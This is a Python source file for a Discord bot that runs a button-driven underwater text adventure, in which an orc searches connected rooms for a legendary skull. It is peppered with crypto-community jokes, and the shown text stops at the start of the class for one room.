import discord
import discord.utils
from discord.ext import commands, tasks
from discord.commands import slash_command, permissions, Option

import os
import re
import string
import random
from dotenv import load_dotenv

load_dotenv()

embedcolor = int(os.getenv('embedcolor'), 16)
pfpurl = os.getenv('pfpurl')
footertext = os.getenv('footertext')

guildIDs = os.getenv('guildIDs')
guildIDs = guildIDs.split(',')
guildIDs = [int(x) for x in guildIDs]

whitelistroleid = int(os.getenv('whitelistroleid'))
knightroleid = int(os.getenv('knightroleid'))
peasantroleid = int(os.getenv('peasantroleid'))
whitelistchannelid = int(os.getenv('whitelistchannelid'))
godroleid = int(os.getenv('godroleid'))
clientuserid = int(os.getenv('clientuserid'))
token = os.getenv('bottoken')


class BeginView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label='Begin', style=discord.ButtonStyle.blurple)
    async def button1(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        cd8 = True
        cd3 = False
        cd2 = False
        cd1 = False
        cd13 = False
        cd12 = False
        cd11 = False
        cd14 = False
        cd15 = False
        d9door = None

        view = D8(cd1, cd2, cd3, cd8, cd11, cd12, cd13, cd14, cd15, d9door)

        await interaction.response.send_message("""Your eyes flutter open. The room is dark, dimly lit by a yellow glowing orb in the center. You wonder how you got here, but the memory is fuzzy.

You feel weightless... because you’re floating? Holy ship you’re under water!

You look down at your hands. You’re an Orc, that’s for sure, sent on a special mission to find... what was it. The skull of a legendary genesis EtherOrc?

You swim towards the yellow glowing orb. It’s nothing special, except for the fact that it’s a glowing orb, underwater, with no source of electricity. Damn, high bar to impress these days. You make a mental note of it as you glance around the small room. It’s about 10 meters by 15 meters and there’s an iron door on each wall. The ground is covered in flat gray stones. There is nothing else of note in the room.
""", view=view, ephemeral=True)


class RestartView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label='Play again...', style=discord.ButtonStyle.blurple)
    async def button1(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        cd8 = True
        cd3 = False
        cd2 = False
        cd1 = False
        cd13 = False
        cd12 = False
        cd11 = False
        cd14 = False
        cd15 = False
        d9door = None

        view = D8(cd1, cd2, cd3, cd8, cd11, cd12, cd13, cd14, cd15, d9door)

        await interaction.response.send_message("""Your eyes flutter open. The room is dark, dimly lit by a yellow glowing orb in the center. You wonder how you got here, but the memory is fuzzy.

You feel weightless... because you’re floating? Holy ship you’re under water!

You look down at your hands. You’re an Orc, that’s for sure, sent on a special mission to find... what was it. The skull of a legendary genesis EtherOrc?

You swim towards the yellow glowing orb. It’s nothing special, except for the fact that it’s a glowing orb, underwater, with no source of electricity. Damn, high bar to impress these days. You make a mental note of it as you glance around the small room. It’s about 10 meters by 15 meters and there’s an iron door on each wall. The ground is covered in flat gray stones. There is nothing else of note in the room.
""", view=view, ephemeral=True)


class D8(discord.ui.View):
    def __init__(self, cd1, cd2, cd3, cd8, cd11, cd12, cd13, cd14, cd15, d9door):
        super().__init__(timeout=None)
        self.cd1 = cd1
        self.cd2 = cd2
        self.cd3 = cd3
        self.cd8 = cd8
        self.cd11 = cd11
        self.cd12 = cd12
        self.cd13 = cd13
        self.cd14 = cd14
        self.cd15 = cd15
        self.d9door = d9door

    @discord.ui.button(label='Go North', style=discord.ButtonStyle.blurple)
    async def d9(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        self.d9door = "D8"
        view = D9(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                  self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

        await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you without a sound.

You’re glad you can’t smell underwater because this room is as gory as a horror movie. Bones float in the murky water, hauntingly suspended all around the room. You sneakily suspect that you can snag some Bone Shards from this place, but you’re not certain... Stay focused! You gasp as you notice an Orc’s skull spinning slowly in one corner.

Cautiously you look around the room for any signs of danger, but none are visible. Could this be dangerous magic you wonder? Is this a trap? You remember your memes, probably a trap.

You spy 2 additional doors besides the one you came through. You should definitely turn around... but will you?
""", view=view, ephemeral=True)

    @discord.ui.button(label='Go East', style=discord.ButtonStyle.blurple)
    async def d3(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        self.cd3 = True
        view = D3(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                  self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

        await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you without a sound.

You brush a thick clump of kelp from your face. You realize the entire room is a dense lush forest of kelp, suspended in the still ocean water. As you swim forward, the plant’s vines wrap around your legs. You shake it off, ripping some, sending the leaves floating away as you turn your attention to the center of the dense room.

A blue orb rests in the center, wrapped by the greenery. As you brush the kelp aside to get a better look, the orb slips out and falls to the ground. You’re surprised it doesn’t shatter when it hits the floor, but as you look closer, you realize it landed on a bed of moss.

You snag some seaweed to snack on later. Could be tasty. After swimming a lap around the room, you’ve noted 3 iron doors.""", view=view, ephemeral=True)

    @discord.ui.button(label='Go South', style=discord.ButtonStyle.blurple)
    async def d7(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        view = D7(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                  self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

        await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you without a sound.

A mountain of what looks to be sand sits idly in the center of the room. You swim toward it, pushing it around. A few crabs scuttle from beneath the pile, clawing their way away from you. You dig deeper into the sand, hoping to find something useful. Perhaps even some mana? Or maybe some NFTs in the Sandbox? Nope. Nothing. You decide to move on to something more exciting.

You notice 3 iron doors in this room.
""", view=view, ephemeral=True)

    @discord.ui.button(label='Go West', style=discord.ButtonStyle.blurple)
    async def d13(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        self.cd13 = True
        view = D13(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                   self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

        await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you without a sound.

You notice almost immediately that this room is particularly interesting. A red orb glows in the center, illuminating detailed pictures chiseled into the walls and ceiling.

Images showing Orcs line the room, in various poses and holding sharp looking weapons. It seems like some of their history has been immortalized here. Detailed drawings of their greatest loot and most vicious battles can be seen on the opposite side of the room. All this culture, you never knew these Orcs had.

You snap back to your task. Your task isn’t learning about Orcs, it’s finding the skull. No time to waste. But will you waste your time going through pointless doors?
""", view=view, ephemeral=True)


class D3(discord.ui.View):
    def __init__(self, cd1, cd2, cd3, cd8, cd11, cd12, cd13, cd14, cd15, d9door):
        super().__init__(timeout=None)
        self.cd1 = cd1
        self.cd2 = cd2
        self.cd3 = cd3
        self.cd8 = cd8
        self.cd11 = cd11
        self.cd12 = cd12
        self.cd13 = cd13
        self.cd14 = cd14
        self.cd15 = cd15
        self.d9door = d9door

    @discord.ui.button(label='Go North', style=discord.ButtonStyle.blurple)
    async def d4(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        view = D4(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                  self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

        await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you with a dull clang.

A huge creature snaps it’s gaze toward you, alerted by the sound! It readies it’s weapon, prepared to swing, but you’re an Orc. Orcs can handle creatures with ease. With a flick of your wrist, you send a blast of magical energy shooting through the water, stunning the creature. It gurgles a bit and closes its eyes, floating to the bottom, stunned.

A glowing teal orb falls out of the creature's loincloth. Where else would it have been?

There’s three iron doors in this room, one from which you came, and two others.
""", view=view, ephemeral=True)

    @discord.ui.button(label='Go South', style=discord.ButtonStyle.blurple)
    async def d2(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        self.cd2 = True
        view = D2(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                  self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

        await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you without a sound.

Treasure galore!! What a haul! Gold trinkets and $ZUG litter the floor, spilling out of several derelict chests. You wonder how all this treasure got here, perhaps this is an Orc’s lair? One with immense strength no doubt.

A purple orb sits in the center, glistening amongst the glittery treasure. You swim toward it and can see a faint reflection of yourself in the magical sphere.

You stuff some jewels down your pants, could be good to save for the family. You glance toward the walls, noticing 2 doors.
""", view=view, ephemeral=True)

    @discord.ui.button(label='Go West', style=discord.ButtonStyle.blurple)
    async def d8(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        view = D8(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                  self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

        await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you without a sound.

You recognize this room instantly. The stone floor. The barren room. It’s dark, dimly lit by a yellow glowing orb in the center. You can’t stay here long, you’ve got a quest to do. Just keep swimming, you think, wondering how the hell you are supposed to find this skull in time.

An iron door adorns each wall in this room.
""", view=view, ephemeral=True)


class D9(discord.ui.View):
    def __init__(self, cd1, cd2, cd3, cd8, cd11, cd12, cd13, cd14, cd15, d9door):
        super().__init__(timeout=None)
        self.cd1 = cd1
        self.cd2 = cd2
        self.cd3 = cd3
        self.cd8 = cd8
        self.cd11 = cd11
        self.cd12 = cd12
        self.cd13 = cd13
        self.cd14 = cd14
        self.cd15 = cd15
        self.d9door = d9door

    @discord.ui.button(label='Go East', style=discord.ButtonStyle.blurple)
    async def d4(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        if self.d9door == "D4":

            view = D4(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                      self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

            await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you with a dull clang.

A huge creature snaps it’s gaze toward you, alerted by the sound! It readies it’s weapon, prepared to swing, but you’re an Orc. Orcs can handle creatures with ease. With a flick of your wrist, you send a blast of magical energy shooting through the water, stunning the creature. It gurgles a bit and closes its eyes, floating to the bottom, stunned.

A glowing teal orb falls out of the creature's loincloth. Where else would it have been?

There’s three iron doors in this room, one from which you came, and two others.""", view=view, ephemeral=True)

        else:

            view = RestartView()

            await interaction.response.send_message("""You swim to the door through the middle of the bone swamp. With a flash of light your body is incinerated, leaving only your bones behind. Your skull slowly spins, a haunting warning to future questers.

You lose...
    """, view=view, ephemeral=True)

    @discord.ui.button(label='Go North', style=discord.ButtonStyle.blurple)
    async def d10(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        if self.d9door == "D10":
            view = D10(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                       self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

            await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you with a dull clang.

Huge rusting pipes line the ceiling and floors. It’s as if you stepped (or swam) into a steampunk movie, they’re everywhere. The water is slightly rust colored and tastes like $ZUG. Nice. Too bad you can’t craft with it to turn it into something valuable.

One of the pipes is cracked, and you can see a lime glow emanating from within. Under further inspection, you confirm that it’s another one of those orbs.

3 iron doors are in this room, hidden behind the maze of pipes.
    """, view=view, ephemeral=True)

        else:

            view = RestartView()

            await interaction.response.send_message("""You swim to the door through the middle of the bone swamp. With a flash of light your body is incinerated, leaving only your bones behind. Your skull slowly spins, a haunting warning to future questers.

You lose...
    """, view=view, ephemeral=True)

    @discord.ui.button(label='Go South', style=discord.ButtonStyle.blurple)
    async def d8(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        if self.d9door == "D8":
            view = D8(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                      self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

            await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you without a sound.

You recognize this room instantly. The stone floor. The barren room. It’s dark, dimly lit by a yellow glowing orb in the center. You can’t stay here long, you’ve got a quest to do. Just keep swimming, you think, wondering how the hell you are supposed to find this skull in time.

An iron door adorns each wall in this room.
    """, view=view, ephemeral=True)

        else:

            view = RestartView()

            await interaction.response.send_message("""You swim to the door through the middle of the bone swamp. With a flash of light your body is incinerated, leaving only your bones behind. Your skull slowly spins, a haunting warning to future questers.

You lose...
    """, view=view, ephemeral=True)


class D2(discord.ui.View):
    def __init__(self, cd1, cd2, cd3, cd8, cd11, cd12, cd13, cd14, cd15, d9door):
        super().__init__(timeout=None)
        self.cd1 = cd1
        self.cd2 = cd2
        self.cd3 = cd3
        self.cd8 = cd8
        self.cd11 = cd11
        self.cd12 = cd12
        self.cd13 = cd13
        self.cd14 = cd14
        self.cd15 = cd15
        self.d9door = d9door

    @discord.ui.button(label='Go North', style=discord.ButtonStyle.blurple)
    async def d3(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        self.cd3 = True
        view = D3(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                  self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

        await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you without a sound.

You brush a thick clump of kelp from your face. You realize the entire room is a dense lush forest of kelp, suspended in the still ocean water. As you swim forward, the plant’s vines wrap around your legs. You shake it off, ripping some, sending the leaves floating away as you turn your attention to the center of the dense room.

A blue orb rests in the center, wrapped by the greenery. As you brush the kelp aside to get a better look, the orb slips out and falls to the ground. You’re surprised it doesn’t shatter when it hits the floor, but as you look closer, you realize it landed on a bed of moss.

You snag some seaweed to snack on later. Could be tasty. After swimming a lap around the room, you’ve noted 3 iron doors.""", view=view, ephemeral=True)

    @discord.ui.button(label='Go South', style=discord.ButtonStyle.blurple)
    async def d1(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        self.cd1 = True
        view = D1(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                  self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

        await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you without a sound.

A school of fish swim slowly around the enclosure. Their shiny scales give off a slight reflection of a green glowing orb in the center of the room. The 100ish fish peacefully move in a circular pattern, as if in a trance.

An eel darts by, startling you, as you turn your attention to the walls - 2 of which have iron doors.""", view=view, ephemeral=True)


class D1(discord.ui.View):
    def __init__(self, cd1, cd2, cd3, cd8, cd11, cd12, cd13, cd14, cd15, d9door):
        super().__init__(timeout=None)
        self.cd1 = cd1
        self.cd2 = cd2
        self.cd3 = cd3
        self.cd8 = cd8
        self.cd11 = cd11
        self.cd12 = cd12
        self.cd13 = cd13
        self.cd14 = cd14
        self.cd15 = cd15
        self.d9door = d9door

    @discord.ui.button(label='Go North', style=discord.ButtonStyle.blurple)
    async def d2(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        self.cd2 = True
        view = D2(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                  self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

        await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you without a sound.

Treasure galore!! What a haul! Gold trinkets and $ZUG litter the floor, spilling out of several derelict chests. You wonder how all this treasure got here, perhaps this is an Orc’s lair? One with immense strength no doubt.

A purple orb sits in the center, glistening amongst the glittery treasure. You swim toward it and can see a faint reflection of yourself in the magical sphere.

You stuff some jewels down your pants, could be good to save for the family. You glance toward the walls, noticing 2 doors.
""", view=view, ephemeral=True)

        self.cd2 = True
        view = D2(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                  self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

        await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you without a sound.

Treasure galore!! What a haul! Gold trinkets litter the floor, spilling out of several pirate chests. You wonder how all this treasure got here, perhaps this is an Ogre’s lair? You remember reading something about how they liked treasure and all.

A purple orb sits in the center, glistening amongst the glittery treasure. You swim toward it and can see a faint reflection of yourself in the magical sphere.

You stuff some jewels down your pants, could be good to save for the family. You glance toward the walls, noticing 2 doors.

""", view=view, ephemeral=True)

    @discord.ui.button(label='Go West', style=discord.ButtonStyle.blurple)
    async def d6(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        view = D6(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                  self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

        await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you without a sound.

The walls are wood-paneled, warping and with cracks due to their submerged nature. It looks almost like a sunken ship, except more rectangular. A gray orb glows in the center, illuminating the shadows in between the cracks of the wood.

You take a second to carve your initials in the wood, ZUG. You gotta leave your mark.

3 iron doors are visible, which will you go through?
""", view=view, ephemeral=True)


class D12(discord.ui.View):
    def __init__(self, cd1, cd2, cd3, cd8, cd11, cd12, cd13, cd14, cd15, d9door):
        super().__init__(timeout=None)
        self.cd1 = cd1
        self.cd2 = cd2
        self.cd3 = cd3
        self.cd8 = cd8
        self.cd11 = cd11
        self.cd12 = cd12
        self.cd13 = cd13
        self.cd14 = cd14
        self.cd15 = cd15
        self.d9door = d9door

    @discord.ui.button(label='Open Door', style=discord.ButtonStyle.blurple)
    async def randbutton(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        doorvalue = random.randrange(1, 4)

        if doorvalue == 1:

            view = D13(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                       self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

            await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you without a sound.

You notice almost immediately that this room is particularly interesting. A red orb glows in the center, illuminating detailed pictures chiseled into the walls and ceiling.

Images showing Orcs line the room, in various poses and holding sharp looking weapons. It seems like some of their history has been immortalized here. Detailed drawings of their greatest loot and most vicious battles can be seen on the opposite side of the room. All this culture, you never knew these Orcs had.

You snap back to your task. Your task isn’t learning about Orcs, it’s finding the skull. No time to waste. But will you waste your time going through pointless doors?
""", view=view, ephemeral=True)

        elif doorvalue == 2:
            view = D7(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                      self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

            await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you without a sound.

A mountain of what looks to be sand sits idly in the center of the room. You swim toward it, pushing it around. A few crabs scuttle from beneath the pile, clawing their way away from you. You dig deeper into the sand, hoping to find something useful. Perhaps even some mana? Or maybe some NFTs in the Sandbox? Nope. Nothing. You decide to move on to something more exciting.

You notice 3 iron doors in this room.""", view=view, ephemeral=True)
        elif doorvalue == 3:
            self.cd11 = True
            view = D11(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                       self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

            await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you without a sound.

You can see yourself in a reflection on the opposite side of the room. Besides the water, this room is spotless. The walls shine with a bright reflective metal material, illuminated by a pink orb in the center of the room. The pink glow bathes the entire room in reflective light.

Since all the walls are mirror-like, it seems like this room extends to infinity, save for 2 iron doors.
""", view=view, ephemeral=True)


class D6(discord.ui.View):
    def __init__(self, cd1, cd2, cd3, cd8, cd11, cd12, cd13, cd14, cd15, d9door):
        super().__init__(timeout=None)
        self.cd1 = cd1
        self.cd2 = cd2
        self.cd3 = cd3
        self.cd8 = cd8
        self.cd11 = cd11
        self.cd12 = cd12
        self.cd13 = cd13
        self.cd14 = cd14
        self.cd15 = cd15
        self.d9door = d9door

    @discord.ui.button(label='Go North', style=discord.ButtonStyle.blurple)
    async def d7(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        view = D7(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                  self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

        await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you without a sound.

A mountain of what looks to be sand sits idly in the center of the room. You swim toward it, pushing it around. A few crabs scuttle from beneath the pile, clawing their way away from you. You dig deeper into the sand, hoping to find something useful. Perhaps even some mana? Or maybe some NFTs in the Sandbox? Nope. Nothing. You decide to move on to something more exciting.

You notice 3 iron doors in this room.
""", view=view, ephemeral=True)

    @discord.ui.button(label='Go East', style=discord.ButtonStyle.blurple)
    async def d1(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        self.cd1 = True
        view = D1(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                  self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

        await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you without a sound.

A school of fish swim slowly around the enclosure. Their shiny scales give off a slight reflection of a green glowing orb in the center of the room. The 100ish fish peacefully move in a circular pattern, as if in a trance.

An eel darts by, startling you, as you turn your attention to the walls - 2 of which have iron doors.""", view=view, ephemeral=True)

    @discord.ui.button(label='Go West', style=discord.ButtonStyle.blurple)
    async def d11(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.cd11 = True
        view = D11(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                   self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

        await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you without a sound.

You can see yourself in a reflection on the opposite side of the room. Besides the water, this room is spotless. The walls shine with a bright reflective metal material, illuminated by a pink orb in the center of the room. The pink glow bathes the entire room in reflective light.

Since all the walls are mirror-like, it seems like this room extends to infinity, save for 2 iron doors.
    """, view=view, ephemeral=True)


class D11(discord.ui.View):
    def __init__(self, cd1, cd2, cd3, cd8, cd11, cd12, cd13, cd14, cd15, d9door):
        super().__init__(timeout=None)
        self.cd1 = cd1
        self.cd2 = cd2
        self.cd3 = cd3
        self.cd8 = cd8
        self.cd11 = cd11
        self.cd12 = cd12
        self.cd13 = cd13
        self.cd14 = cd14
        self.cd15 = cd15
        self.d9door = d9door

    @discord.ui.button(label='Go North', style=discord.ButtonStyle.blurple)
    async def d12(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        self.cd12 = True
        view = D12(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                   self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

        await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you without a sound.

Darkness envelops you. There is no sound in this room, it feels like empty space. You cannot see anything, including your hands or body. You have no idea which way is up. You begin to swim forward but a current pushes you. You can feel yourself spinning, but you don’t know which way you came from!

You find a wall. Or is it the ceiling? Who knows. You feel around further and touch what seems to be an iron door.
""", view=view, ephemeral=True)

    @discord.ui.button(label='Go East', style=discord.ButtonStyle.blurple)
    async def d6(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        view = D6(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                  self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

        await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you without a sound.

The walls are wood-paneled, warping and with cracks due to their submerged nature. It looks almost like a sunken ship, except more rectangular. A gray orb glows in the center, illuminating the shadows in between the cracks of the wood.

You take a second to carve your initials in the wood, ZUG. You gotta leave your mark.

3 iron doors are visible, which will you go through?
""", view=view, ephemeral=True)


class D14(discord.ui.View):
    def __init__(self, cd1, cd2, cd3, cd8, cd11, cd12, cd13, cd14, cd15, d9door):
        super().__init__(timeout=None)
        self.cd1 = cd1
        self.cd2 = cd2
        self.cd3 = cd3
        self.cd8 = cd8
        self.cd11 = cd11
        self.cd12 = cd12
        self.cd13 = cd13
        self.cd14 = cd14
        self.cd15 = cd15
        self.d9door = d9door

    @discord.ui.button(label='Go South', style=discord.ButtonStyle.blurple)
    async def d13(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        self.cd13 = True
        view = D13(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                   self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

        await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you without a sound.

You notice almost immediately that this room is particularly interesting. A red orb glows in the center, illuminating detailed pictures chiseled into the walls and ceiling.

Images showing Orcs line the room, in various poses and holding sharp looking weapons. It seems like some of their history has been immortalized here. Detailed drawings of their greatest loot and most vicious battles can be seen on the opposite side of the room. All this culture, you never knew these Orcs had.

You snap back to your task. Your task isn’t learning about Orcs, it’s finding the skull. No time to waste. But will you waste your time going through pointless doors?
""", view=view, ephemeral=True)

    @discord.ui.button(label='Go North', style=discord.ButtonStyle.blurple)
    async def d15(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        self.cd15 = True
        view = D15(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                   self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

        await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you without a sound.

This room is clearly the most important. A gold orb shines brightly, suspended above a gold plated podium, adorned with jewels and ornaments.

Bioluminescent bacteria float gracefully in the water, creating an amazing shimmering effect, almost like stars in space that you can swim through.

There are 2 doors in this room, one of which you used to enter.
""", view=view, ephemeral=True)


class D7(discord.ui.View):
    def __init__(self, cd1, cd2, cd3, cd8, cd11, cd12, cd13, cd14, cd15, d9door):
        super().__init__(timeout=None)
        self.cd1 = cd1
        self.cd2 = cd2
        self.cd3 = cd3
        self.cd8 = cd8
        self.cd11 = cd11
        self.cd12 = cd12
        self.cd13 = cd13
        self.cd14 = cd14
        self.cd15 = cd15
        self.d9door = d9door

    @discord.ui.button(label='Go North', style=discord.ButtonStyle.blurple)
    async def d8(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        view = D8(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                  self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

        await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you without a sound.

You recognize this room instantly. The stone floor. The barren room. It’s dark, dimly lit by a yellow glowing orb in the center. You can’t stay here long, you’ve got a quest to do. Just keep swimming, you think, wondering how the hell you are supposed to find this skull in time.

An iron door adorns each wall in this room.
""", view=view, ephemeral=True)

    @discord.ui.button(label='Go West', style=discord.ButtonStyle.blurple)
    async def d12(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        self.cd12 = True
        view = D12(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                   self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

        await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you without a sound.

Darkness envelops you. There is no sound in this room, it feels like empty space. You cannot see anything, including your hands or body. You have no idea which way is up. You begin to swim forward but a current pushes you. You can feel yourself spinning, but you don’t know which way you came from!

You find a wall. Or is it the ceiling? Who knows. You feel around further and touch what seems to be an iron door.
""", view=view, ephemeral=True)

    @discord.ui.button(label='Go South', style=discord.ButtonStyle.blurple)
    async def d6(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        view = D6(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                  self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

        await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you without a sound.

The walls are wood-paneled, warping and with cracks due to their submerged nature. It looks almost like a sunken ship, except more rectangular. A gray orb glows in the center, illuminating the shadows in between the cracks of the wood.

You take a second to carve your initials in the wood, ZUG. You gotta leave your mark.

3 iron doors are visible, which will you go through?
""", view=view, ephemeral=True)


class D10(discord.ui.View):
    def __init__(self, cd1, cd2, cd3, cd8, cd11, cd12, cd13, cd14, cd15, d9door):
        super().__init__(timeout=None)
        self.cd1 = cd1
        self.cd2 = cd2
        self.cd3 = cd3
        self.cd8 = cd8
        self.cd11 = cd11
        self.cd12 = cd12
        self.cd13 = cd13
        self.cd14 = cd14
        self.cd15 = cd15
        self.d9door = d9door

    @discord.ui.button(label='Go East', style=discord.ButtonStyle.blurple)
    async def d5(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        view = D5(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                  self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

        await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you with a loud clang. A huge iron gear rotates around a thick rusty post. The door shuts and the gears stop turning.

A glowing orange orb sits atop the gear, making the pipes look even more rusty than they already are.

You carefully swim around the room, noting 20 large gears. They all look like they individually turn. You try rotating one and to your surprise, it slowly twists. You can hear clicking in the distance. As you release pressure, it spins in the opposite direction, halting with a loud clang above you. You wonder what they could be for, but you take a guess that they’re connected to the doors in some way.

Probably nothing.
""", view=view, ephemeral=True)

    @discord.ui.button(label='Go South', style=discord.ButtonStyle.blurple)
    async def d9(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        self.d9door = "D10"
        view = D9(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                  self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

        await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you without a sound.

You’re glad you can’t smell underwater because this room is as gory as a horror movie. Bones float in the murky water, hauntingly suspended all around the room. You sneakily suspect that you can snag some Bone Shards from this place, but you’re not certain... Stay focused! You gasp as you notice an Orc’s skull spinning slowly in one corner.

Cautiously you look around the room for any signs of danger, but none are visible. Could this be dangerous magic you wonder? Is this a trap? You remember your memes, probably a trap.

You spy 2 additional doors besides the one you came through. You should definitely turn around... but will you?
""", view=view, ephemeral=True)

    @discord.ui.button(label='Go West', style=discord.ButtonStyle.blurple)
    async def d15(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.stop()

        self.cd15 = True
        view = D15(self.cd1, self.cd2, self.cd3, self.cd8, self.cd11,
                   self.cd12, self.cd13, self.cd14, self.cd15, self.d9door)

        await interaction.response.send_message("""The submerged iron door mysteriously swings shut behind you without a sound.

This room is clearly the most important. A gold orb shines brightly, suspended above a gold plated podium, adorned with jewels and ornaments.

Bioluminescent bacteria float gracefully in the water, creating an amazing shimmering effect, almost like stars in space that you can swim through.

There are 2 doors in this room, one of which you used to enter.
""", view=view, ephemeral=True)


class D4(discord.ui.View):
